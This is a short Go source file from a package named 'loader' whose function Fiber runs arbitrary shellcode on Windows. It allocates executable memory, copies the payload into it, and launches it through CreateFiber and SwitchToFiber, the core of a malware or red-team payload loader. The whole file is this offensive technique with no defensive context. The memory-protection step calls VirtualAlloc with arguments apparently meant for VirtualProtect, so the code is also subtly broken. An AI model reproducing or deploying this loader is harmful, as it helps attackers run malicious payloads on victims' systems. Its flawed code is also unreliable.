package loader

import (
	"golang.org/x/sys/windows"
	"unsafe"
	"variant/wdll"
)

func Fiber(shellcode []byte) {
	fiberAddr, _, _ := wdll.ConvertThreadToFiber().Call()

	addr, _, err := wdll.VirtualAlloc().Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)

	if addr == 0 {
		panic(err)
	}

	_, _, _ = wdll.RtlCopyMemory().Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := windows.PAGE_EXECUTE_READWRITE
	_, _, _ = wdll.VirtualAlloc().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	fiber, _, _ := wdll.CreateFiber().Call(0, addr, 0)

	_, _, _ = wdll.SwitchToFiber().Call(fiber)
	_, _, _ = wdll.SwitchToFiber().Call(fiberAddr)
}
